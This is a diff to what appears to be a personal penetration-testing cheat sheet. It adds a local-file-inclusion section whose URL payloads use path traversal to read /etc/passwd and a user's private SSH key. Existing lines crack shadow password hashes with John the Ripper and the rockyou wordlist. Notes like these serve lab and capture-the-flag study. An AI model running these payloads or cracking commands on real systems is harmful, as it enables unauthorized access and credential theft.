@@ -263,8 +263,12 @@ Cracking Shadow Hash
 
 	unshadow passwd shadow > john.hash
 	john john.hash --wordlist=/usr/share/wordlists/rockyou.txt 
-
-
+LFI
+`four directory back then accss the server system` `see the sourcecode for better view` 
+	
+	website/home/?page=/../../../etc/passwd
+	website/home/?page=/../../../home/falcon/.ssh/id_rsa
+	
 # @cc github.com/prakashchand72
 
 
